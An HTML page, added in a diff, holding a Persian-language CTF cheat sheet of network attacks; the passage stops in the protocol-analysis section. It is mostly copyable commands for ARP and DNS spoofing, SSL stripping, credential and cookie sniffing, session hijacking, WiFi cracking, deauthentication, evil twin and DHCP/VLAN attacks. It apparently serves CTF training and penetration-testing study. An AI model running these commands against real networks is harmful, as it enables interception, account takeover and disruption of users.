@@ -1,0 +1,1241 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Security Ultimate CTF Guide - Final Edition</title>
+    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <style>
+        :root {
+            --bg-color: #0d1117;
+            --card-bg: #161b22;
+            --border-color: #30363d;
+            --text-color: #c9d1d9;
+            --muted-color: #8b949e;
+            --primary-color: #39d0d8; /* Cyan/Teal for Network Security */
+            --accent-color: #56e2e9;  /* Light Cyan accent */
+            --warn-color: #e3b341;
+            --danger-color: #f85149;
+            --code-bg: #010409;
+            --hover-bg: #1f2937;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Vazirmatn', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            display: flex;
+            min-height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 300px;
+            background-color: var(--card-bg);
+            border-left: 1px solid var(--border-color);
+            padding: 20px;
+            position: fixed;
+            height: 100vh;
+            overflow-y: auto;
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sidebar-header {
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+        }
+
+        .sidebar-header h1 {
+            color: var(--primary-color);
+            font-size: 1.4rem;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        .sidebar-header p {
+            color: var(--muted-color);
+            font-size: 0.8rem;
+            text-align: center;
+        }
+
+        .search-box {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 10px 15px;
+            background-color: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-color);
+            font-family: 'Vazirmatn', sans-serif;
+            font-size: 0.9rem;
+            transition: all 0.2s;
+        }
+
+        .search-box input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(57, 208, 216, 0.2);
+        }
+
+        .nav-list {
+            list-style: none;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .nav-list li {
+            margin-bottom: 5px;
+        }
+
+        .nav-list li a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 12px;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+            font-size: 0.9rem;
+            border-right: 3px solid transparent;
+        }
+
+        .nav-list li a:hover {
+            background-color: var(--hover-bg);
+            color: var(--primary-color);
+        }
+
+        .nav-list li a.active {
+            background-color: rgba(57, 208, 216, 0.1);
+            color: var(--primary-color);
+            border-right: 3px solid var(--primary-color);
+            font-weight: bold;
+        }
+
+        .nav-badge {
+            font-size: 0.7rem;
+            background: var(--bg-color);
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: var(--muted-color);
+        }
+
+        /* Main Content */
+        .main-content {
+            margin-right: 300px;
+            padding: 40px;
+            flex: 1;
+            max-width: 1100px;
+        }
+
+        .main-header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .main-header h1 {
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(57, 208, 216, 0.3);
+        }
+
+        .main-header p {
+            color: var(--muted-color);
+            font-size: 1.1rem;
+        }
+
+        /* Tool Sections */
+        .tool-section {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 40px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.2);
+            scroll-margin-top: 20px;
+        }
+
+        .tool-title {
+            color: var(--accent-color);
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+        }
+
+        /* Badges & Tags */
+        .goal-box {
+            background: rgba(57, 208, 216, 0.1);
+            border: 1px solid rgba(57, 208, 216, 0.2);
+            border-right: 4px solid var(--primary-color);
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 25px;
+            color: var(--primary-color);
+        }
+
+        .sub-title {
+            color: var(--text-color);
+            margin: 25px 0 15px 0;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .tag {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        .tag-base { background: rgba(57, 208, 216, 0.2); color: var(--primary-color); }
+        .tag-ctf { background: rgba(86, 226, 233, 0.2); color: var(--accent-color); }
+        .tag-tip { background: rgba(227, 179, 65, 0.2); color: var(--warn-color); }
+
+        /* Code Blocks (Terminal Style) */
+        .code-container {
+            position: relative;
+            margin: 15px 0;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            background: var(--code-bg);
+        }
+
+        .code-header {
+            background: #161b22;
+            padding: 8px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .code-dots {
+            display: flex;
+            gap: 6px;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+        .dot-red { background: #ff5f56; }
+        .dot-yellow { background: #ffbd2e; }
+        .dot-green { background: #27c93f; }
+
+        .code-lang {
+            color: var(--muted-color);
+            font-size: 0.8rem;
+            font-family: monospace;
+        }
+
+        .copy-btn {
+            background: transparent;
+            color: var(--muted-color);
+            border: 1px solid var(--border-color);
+            padding: 4px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: all 0.2s;
+            font-family: 'Vazirmatn', sans-serif;
+        }
+
+        .copy-btn:hover {
+            background: var(--primary-color);
+            color: #000;
+            border-color: var(--primary-color);
+        }
+
+        pre {
+            background-color: var(--code-bg) !important;
+            padding: 15px !important;
+            border-radius: 0;
+            overflow-x: auto;
+            margin: 0;
+            direction: ltr;
+            text-align: left;
+            max-height: 600px;
+        }
+
+        code {
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        /* Table Styles */
+        .table-container {
+            overflow-x: auto;
+            margin: 20px 0;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--card-bg);
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: right;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        th {
+            background-color: var(--bg-color);
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover td {
+            background-color: var(--hover-bg);
+        }
+
+        /* Checklist & Special Blocks */
+        .checklist-box {
+            background: rgba(86, 226, 233, 0.05);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        .checklist-box ul {
+            list-style: none;
+        }
+        .checklist-box li {
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        .checklist-box li::before {
+            content: "☐";
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            margin-left: 10px;
+        }
+
+        .tip-box {
+            background: rgba(227, 179, 65, 0.05);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        .tip-box ol {
+            padding-right: 20px;
+        }
+        .tip-box li {
+            margin-bottom: 10px;
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            body { flex-direction: column; }
+            .sidebar {
+                position: relative;
+                width: 100%;
+                height: auto;
+                border-left: none;
+                border-bottom: 1px solid var(--border-color);
+            }
+            .main-content {
+                margin-right: 0;
+                padding: 20px;
+                width: 100%;
+            }
+            .nav-list { max-height: 200px; }
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-color); }
+        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--primary-color); }
+    </style>
+</head>
+<body>
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <h1>🌐 NETWORK SECURITY</h1>
+            <p>Ultimate CTF Guide - Final</p>
+        </div>
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="🔎 جستجوی فاز..." oninput="filterTools()">
+        </div>
+        <ul class="nav-list" id="navList">
+            <li><a href="#intro">🎯 هدف نهایی <span class="nav-badge">Goal</span></a></li>
+            <li><a href="#phase0">فاز ۰: آماده‌سازی <span class="nav-badge">Prep</span></a></li>
+            <li><a href="#phase1">فاز ۱: MITM <span class="nav-badge">Spoofing</span></a></li>
+            <li><a href="#phase2">فاز ۲: Sniffing <span class="nav-badge">Capture</span></a></li>
+            <li><a href="#phase3">فاز ۳: Session Hijack <span class="nav-badge">Cookie</span></a></li>
+            <li><a href="#phase4">فاز ۴: Wireless <span class="nav-badge">WiFi</span></a></li>
+            <li><a href="#phase5">فاز ۵: Net Layer <span class="nav-badge">DHCP/VLAN</span></a></li>
+            <li><a href="#phase6">فاز ۶: Protocols <span class="nav-badge">Analysis</span></a></li>
+            <li><a href="#phase7">فاز ۷: Tools <span class="nav-badge">Auto</span></a></li>
+            <li><a href="#phase8">فاز ۸: سناریوها <span class="nav-badge">CTF</span></a></li>
+            <li><a href="#checklist">چک‌لیست نهایی <span class="nav-badge">100%</span></a></li>
+            <li><a href="#tips">نکات طلایی <span class="nav-badge">Pro</span></a></li>
+            <li><a href="#machines">ماشین‌های پیشنهادی <span class="nav-badge">Practice</span></a></li>
+        </ul>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <header class="main-header">
+            <h1>چیت‌شیت فوق‌جامع امنیت شبکه</h1>
+            <p>نسخه نهایی و ایمن برای مسابقات حرفه‌ای CTF - نمایش کدها بدون اجرا</p>
+        </header>
+
+        <!-- Intro -->
+        <section id="intro" class="tool-section">
+            <h2 class="tool-title">🎯 هدف نهایی</h2>
+            <div class="goal-box">
+                کسب تسلط کامل بر حملات شبکه، شنود ترافیک، تحلیل بسته‌ها و ربودن نشست‌ها در محیط‌های شبکه‌ای، مناسب برای مسابقات CTF و تست‌نفوذ واقعی.
+            </div>
+        </section>
+
+        <!-- Phase 0 -->
+        <section id="phase0" class="tool-section">
+            <h2 class="tool-title">📋 فاز ۰: آماده‌سازی محیط شبکه</h2>
+            
+            <h3 class="sub-title">۱. شناسایی شبکه و دستگاه‌ها</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># شناسایی شبکه محلی
+ip a
+ifconfig
+ip route
+route -n
+
+# شناسایی تمام دستگاه‌های شبکه
+nmap -sn 192.168.1.0/24
+arp -a
+netdiscover -r 192.168.1.0/24
+arp-scan --local
+
+# شناسایی دستگاه‌های خاص
+nmap -O 192.168.1.1-254
+nmap -sV 192.168.1.100</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. فعال کردن IP Forwarding (مهم!)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># فعال کردن موقت
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+
+# فعال کردن دائم
+sysctl -w net.ipv4.ip_forward=1
+echo "net.ipv4.ip_forward=1" &gt;&gt; /etc/sysctl.conf
+
+# بررسی
+cat /proc/sys/net/ipv4/ip_forward
+sysctl net.ipv4.ip_forward</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. پیکربندی iptables برای NAT</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># تنظیم NAT برای ارسال ترافیک
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+
+# فعال کردن logging
+iptables -A FORWARD -j LOG --log-prefix "FORWARD: "</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 1 -->
+        <section id="phase1" class="tool-section">
+            <h2 class="tool-title">🎯 فاز ۱: حملات مرد میانی (MITM)</h2>
+            
+            <h3 class="sub-title">۱. ARP Spoofing (مسموم کردن جدول ARP)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># با ابزار arpspoof (از dsniff)
+apt-get install dsniff
+
+# Spoof کردن قربانی به گیت‌وی
+arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+
+# Spoof کردن گیت‌وی به قربانی
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
+
+# هر دو جهت (بهتر)
+arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &amp;
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &amp;
+
+# با ابزار ettercap
+ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//
+
+# با bettercap
+bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on"</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. DNS Spoofing (جعل پاسخ DNS)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># با ettercap
+cat &gt; /etc/ettercap/etter.dns &lt;&lt; EOF
+*.target.com A 192.168.1.50
+*.google.com A 192.168.1.50
+bank.com A 192.168.1.50
+*.bank.com A 192.168.1.50
+EOF
+
+ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1// -P dns_spoof
+
+# با bettercap
+bettercap -eval "set dns.spoof.domains target.com; set dns.spoof.address 192.168.1.50; dns.spoof on; arp.spoof on"
+
+# با dnschef
+pip install dnschef
+dnschef --fakeip=192.168.1.50 --fakedomains=target.com,google.com -i 0.0.0.0 -p 53</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. حملات MITM پیشرفته (SSL Strip)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># با ettercap
+ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1// -F sslstrip.filter
+
+# با bettercap
+bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; set https.proxy.sslstrip true; https.proxy on"
+
+# HSTS Bypass با bettercap
+bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; set https.proxy.hsts_bypass true; https.proxy on"</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 2 -->
+        <section id="phase2" class="tool-section">
+            <h2 class="tool-title">📡 فاز ۲: شنود ترافیک (Sniffing)</h2>
+            
+            <h3 class="sub-title">۱. ابزارهای شنود پیشرفته (tcpdump)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># شنود تمام ترافیک
+tcpdump -i eth0
+
+# فقط HTTP
+tcpdump -i eth0 -A -s 0 'tcp port 80'
+tcpdump -i eth0 -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420)'  # GET requests
+
+# فقط POST
+tcpdump -i eth0 -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354)'
+
+# HTTP با هدرها
+tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -E "(GET|POST|Host|Cookie)"
+
+# فقط DNS
+tcpdump -i eth0 -vvv -s 0 port 53
+
+# فقط FTP
+tcpdump -i eth0 -A -s 0 'tcp port 21'
+
+# با فیلتر ip
+tcpdump -i eth0 host 192.168.1.100
+tcpdump -i eth0 src 192.168.1.100
+tcpdump -i eth0 dst 192.168.1.100
+
+# ذخیره در فایل
+tcpdump -i eth0 -w capture.pcap
+tcpdump -r capture.pcap</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. فیلترهای ضروری Wireshark</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># HTTP
+http
+http.request.method == "GET"
+http.request.method == "POST"
+http.request.uri contains "login"
+http.cookie
+http.host == "target.com"
+
+# DNS
+dns
+dns.qry.name contains "target"
+dns.resp.addr == 192.168.1.50
+dns.flags.response == 0  # فقط درخواست‌ها
+
+# ARP
+arp
+arp.opcode == 1  # درخواست
+arp.opcode == 2  # پاسخ
+arp.src.proto_ipv4 == 192.168.1.100
+
+# TCP/UDP
+tcp.port == 80
+udp.port == 53
+tcp.flags.syn == 1
+tcp.flags.reset == 1
+
+# IP
+ip.addr == 192.168.1.100
+ip.src == 192.168.1.100
+ip.dst == 192.168.1.100
+ip.ttl &lt; 64
+
+# SMB
+smb
+smb.cmd == 1  # SMB Negotiate
+smb2
+
+# FTP
+ftp
+ftp.request.command == "USER"
+ftp.request.command == "PASS"
+
+# Telnet
+telnet
+
+# کوکی‌ها
+http.cookie
+http.cookie contains "session"</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. استخراج اطلاعات از ترافیک</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># استخراج فایل‌ها از HTTP
+tcpflow -r capture.pcap -e http -o output_dir
+
+# استخراج تصاویر از ترافیک
+driftnet -i eth0 -a -d images/
+
+# استخراج فایل‌های SMB
+tshark -r capture.pcap -Y "smb.cmd == 1"
+smbclient //192.168.1.100/share -U user%pass</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 3 -->
+        <section id="phase3" class="tool-section">
+            <h2 class="tool-title">🍪 فاز ۳: ربودن نشست (Session Hijacking)</h2>
+            
+            <h3 class="sub-title">۱. استخراج کوکی از ترافیک</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># استخراج کوکی‌های HTTP
+tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -E "(Cookie|Set-Cookie)"
+
+# ذخیره در فایل
+tcpdump -i eth0 -A -s 0 'tcp port 80' | grep Cookie &gt; cookies.txt
+
+# با Wireshark
+# فیلتر: http.cookie
+# سپس: right-click -&gt; Follow TCP Stream
+# کوکی را کپی کنید</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. استفاده از کوکی‌های دزدیده شده</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># با curl
+curl -H "Cookie: PHPSESSID=abc123; user=admin" http://target.com/admin
+
+# ذخیره کوکی
+curl -c cookies.txt http://target.com/login
+curl -b cookies.txt http://target.com/dashboard</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. استفاده با Python</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">python</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-python">import requests
+
+cookies = {
+    'PHPSESSID': 'abc123',
+    'user': 'admin'
+}
+response = requests.get('http://target.com/admin', cookies=cookies)
+print(response.text)</code></pre>
+            </div>
+
+            <h3 class="sub-title">۴. Session Fixation (ثابت کردن نشست)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ارسال لینک به قربانی
+http://target.com/login?PHPSESSID=attacker_session_id
+
+# سپس قربانی وارد می‌شود
+# حالا شما با همان session_id وارد می‌شوید</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 4 -->
+        <section id="phase4" class="tool-section">
+            <h2 class="tool-title">📶 فاز ۴: امنیت بی‌سیم (Wireless Security)</h2>
+            
+            <h3 class="sub-title">۱. اطلاعات پایه WiFi</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># فعال کردن interface در حالت monitor
+airmon-ng start wlan0
+ifconfig wlan0mon up
+
+# شناسایی شبکه‌ها
+airodump-ng wlan0mon
+
+# شناسایی با جزئیات
+airodump-ng --bssid XX:XX:XX:XX:XX:XX -c 6 wlan0mon
+
+# با aircrack-ng
+airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. حملات WPA/WPA2</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># مرحله 1: شنود
+airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
+
+# مرحله 2: Deauthentication (قطع اتصال)
+aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon
+
+# مرحله 3: گرفتن handshake
+# در airodump-ng پیام [WPA handshake] را ببینید
+
+# کرک کردن (Cracking) WPA/WPA2:
+aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+
+# با hashcat
+cap2hccapx capture-01.cap capture.hccapx
+hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt
+
+# حملات PMKID (بدون نیاز به handshake)
+hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcap
+hcxpcaptool -z hash.txt capture.pcap
+hashcat -m 16800 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. Evil Twin Attack (حمله دوقلوی شیطانی)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># با aircrack-ng
+airbase-ng -e "FreeWiFi" -c 6 wlan0mon
+
+ifconfig at0 up
+ifconfig at0 10.0.0.1 netmask 255.255.255.0
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+dnsmasq -C /etc/dnsmasq.conf
+
+# با bettercap
+bettercap -eval "set wifi.ap.ssid FreeWiFi; set wifi.ap.bssid 00:11:22:33:44:55; wifi.ap; wifi.sniff"
+
+# با Fluxion (اتوماتیک)
+git clone https://github.com/FluxionNetwork/fluxion.git
+cd fluxion
+./fluxion.sh</code></pre>
+            </div>
+
+            <h3 class="sub-title">۴. حملات WEP و Deauthentication</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># WEP: جمع‌آوری IV
+airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
+
+# WEP: Fake Auth
+aireplay-ng -1 0 -e target_network -a XX:XX:XX:XX:XX:XX -h YY:YY:YY:YY:YY:YY wlan0mon
+
+# WEP: ARP Replay
+aireplay-ng -3 -b XX:XX:XX:XX:XX:XX -h YY:YY:YY:YY:YY:YY wlan0mon
+
+# WEP: کرک کردن
+aircrack-ng -b XX:XX:XX:XX:XX:XX capture-01.cap
+
+# Deauth همه
+aireplay-ng -0 0 -a XX:XX:XX:XX:XX:XX wlan0mon
+
+# Deauth با mdk4
+mdk4 wlan0mon d -b XX:XX:XX:XX:XX:XX -c 6</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 5 -->
+        <section id="phase5" class="tool-section">
+            <h2 class="tool-title">🛡️ فاز ۵: حملات لایه شبکه</h2>
+            
+            <h3 class="sub-title">۱. حملات DHCP</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># DHCP Starvation با yersinia
+yersinia -I
+&gt; dhcp
+&gt; create_new_dhcp_attack
+&gt; send_discover_packet
+
+# با macof
+macof -i eth0 -s 192.168.1.100
+
+# DHCP Spoofing با dnsmasq
+dnsmasq -C /etc/dnsmasq.conf -i eth0
+# در /etc/dnsmasq.conf
+# dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
+# dhcp-option=3,192.168.1.1
+# dhcp-option=6,8.8.8.8</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. حملات VLAN و مسیریابی</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># VLAN Hopping با yersinia
+yersinia -I
+&gt; vlan
+&gt; create_vlan_hopping
+
+# RIP Routing Attack
+yersinia -I
+&gt; rip
+&gt; send_rip_route
+
+# OSPF Attack
+yersinia -I
+&gt; ospf
+&gt; create_ospf_attack</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 6 -->
+        <section id="phase6" class="tool-section">
+            <h2 class="tool-title">🔍 فاز ۶: تحلیل پروتکل‌های خاص</h2>
+            
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># تحلیل HTTP/HTTPS
+tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -E "(GET|POST|Host|User-Agent|Cookie)"
+tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri -e http.cookie
+ngrep -d eth0 -W byline "password|passwd|login"
+
+# تحلیل DNS
+tcpdump -i eth0 -vvv port 53
+tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name
+
+# تحلیل FTP
+tcpdump -i eth0 -A -s 0 'tcp port 21' | grep -E "(USER|PASS|220|331|230)"
+
+# تحلیل SMTP
+tcpdump -i eth0 -A -s 0 'tcp port 25' | grep -E "(MAIL FROM|RCPT TO|DATA|Subject|From|To)"
+
+# تحلیل SMB
+tshark -r capture.pcap -Y "smb2.cmd == 1" -T fields -e smb2.mid -e smb2.tid
